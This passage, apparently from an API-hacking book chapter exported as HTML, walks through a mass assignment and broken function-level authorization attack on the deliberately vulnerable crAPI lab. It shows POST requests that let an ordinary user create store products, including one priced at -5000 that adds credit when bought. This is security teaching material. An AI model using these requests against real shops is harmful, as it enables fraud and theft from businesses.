payloads" src="images/image4.png" style="width: 498.67px; height: 666.67px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c17"><span class="c21">Figure 11-3</span><span class="c0">: Burp Suite Intruder results</span></p><p class="c2"><span class="c8">The response tells us that we&rsquo;ve omitted certain required fields from the POST request. The best part is the API tells us the required parameters. If we think it through, we can guess that the request is likely meant for a crAPI administrator to use in order to update the crAPI store. However, since this request is not restricted to administrators, we have likely stumbled across a combined mass assignment and BFLA vulnerability. Perhaps we can create a new item in the store and update our credit at the same time:</span></p><p class="c3"><span class="c7">POST /workshop/api/shop/products HTTP/1.1</span></p><p class="c3 c11"><span class="c7"></span></p><p class="c3"><span class="c7">Host: 192.168.195.130:8888</span></p><p class="c3"><span class="c14">Authorization: Bearer </span><span class="c4">UserA-Token</span></p><p class="c3 c11"><span class="c7"></span></p><p class="c3"><span class="c7">{</span></p><p class="c3"><span class="c7">&quot;name&quot;:&quot;TEST1&quot;,</span></p><p class="c3"><span class="c7">&quot;price&quot;:25,</span></p><p class="c3"><span class="c7">&quot;image_url&quot;:&quot;string&quot;,</span></p><p class="c3"><span class="c7">&quot;credit&quot;:1337</span></p><p class="c10"><span class="c7">}</span></p><p class="c2"><span class="c8">This request succeeds with an HTTP 200 OK response! If we visit the crAPI store in a browser, we&rsquo;ll notice that we successfully created a new item in the store with a new price of 25, but, unfortunately, our credit remains unaffected. If we purchase this item, we&rsquo;ll notice that it automatically subtracts that amount from our credit, as any regular store transaction should.</span></p><p class="c2"><span class="c8">Now it&rsquo;s time to put on our adversarial hat and think through this business logic. As the consumer of crAPI, we shouldn&rsquo;t be able to add products to the store or adjust prices . . . but we can. If the developers programmed the API under the assumption that only trustworthy users would add products to the crAPI store, what could we possibly do to exploit this situation? We could give ourselves an extreme discount on a product&mdash;maybe a deal so good that the price is actually a negative number:</span></p><p class="c3"><span class="c7">POST /workshop/api/shop/products HTTP/1.1</span></p><p class="c3 c11"><span class="c7"></span></p><p class="c3"><span class="c7">Host: 192.168.195.130:8888</span></p><p class="c3"><span class="c7">Authorization: Bearer UserA-Token</span></p><p class="c3 c11"><span class="c7"></span></p><p class="c3"><span class="c7">{</span></p><p class="c3"><span class="c7">&quot;name&quot;:&quot;MassAssignment SPECIAL&quot;,</span></p><p class="c3"><span class="c7">&quot;price&quot;:-5000,</span></p><p class="c3"><span class="c7">&quot;image_url&quot;:&quot;https://example.com/chickendinner.jpg&quot;</span></p><p class="c10"><span class="c7">}</span></p><p class="c2"><span class="c9">The item </span><span class="c1">MassAssignment SPECIAL</span><span class="c9">&nbsp;is one of a kind: if you purchase it, the store will pay you 5,000 credits. Sure enough, this request receives an HTTP 200 OK response. As you can see in </span><span class="c15"><a class="c19" href="https://www.google.com/url?q=https://learning.oreilly.com/library/view/hacking-apis/9781098130244/c11.xhtml%23figure11-4&amp;sa=D&amp;source=editors&amp;ust=1681144495831862&amp;usg=AOvVaw3cZdWPggmncdHYEsYTG6Gw">Figure 11-4</a></span><span class="c8">, we have successfully added the item to the crAPI store.</span></p><p class="c6"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 389.33px;"><img alt="screenshot of crapi&rsquo;s store that shows an item called massassignment special for $-5000.00" src="images/image2.png" style="width: 624.00px; height: 389.33px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c17"><span class="c21">Figure 11-4</span><span class="c0">: The MassAssignment SPECIAL on crAPI</span></p><p class="c2"><span class="c9">By purchasing this special deal, we add an extra $5,000 to our available balance (see </span><span class="c15"><a class="c19" href="https://www.google.com/url?q=https://learning.oreilly.com/library/view/hacking-apis/9781098130244/c11.xhtml%23figure11-5&amp;sa=D&amp;source=editors&amp;ust=1681144495833072&amp;usg=AOvVaw3iASYuMpLh3Vu9YMsDoN9j">Figure 11-5</a></span><span class="c8">).</span></p><p class="c6"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 592.00px; height: 258.67px;"><img alt="screenshot of crapi&rsquo;s shop that shows the available balance as $5030" src="images/image5.png" style="width: 592.00px; height: 258.67px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c17"><span class="c21">Figure 11-5</span><span class="c0">: Available balance on crAPI</span></p><p class="c2"><span class="c8">As you can see, our mass assignment exploit would have severe consequences for any business with this vulnerability. I hope your bounty for such a finding greatly outweighs the credit you could add to your account! In the next chapter, we&rsquo;ll begin our journey through the wide variety of potential injection attacks we can leverage against APIs.</span></p><p class="c3 c11"><span class="c26 c29"></span></p></body></html>